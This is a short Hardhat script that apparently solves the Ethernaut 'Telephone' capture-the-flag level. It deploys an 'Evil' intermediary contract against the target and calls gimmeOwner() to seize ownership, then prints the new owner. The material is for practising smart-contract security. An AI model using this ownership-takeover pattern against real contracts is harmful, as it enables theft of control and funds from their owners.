import { ethers } from "hardhat";
import { Evil__factory, Telephone__factory } from "../typechain-types";

async function main() {
  // Claim ownership of the contract below to complete this level.

  let tx; // will have to wait for each tx
  let [deployer] = await ethers.getSigners();
  let contract = "0xF79636A7800544B9eEf5c4e2a0B62dAf27E6B03D";
  let telephone = new Telephone__factory(deployer).attach(contract);
  let evil = await new Evil__factory(deployer).deploy(contract);

  tx = await evil.gimmeOwner();
  await tx.wait();
  console.log(await telephone.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
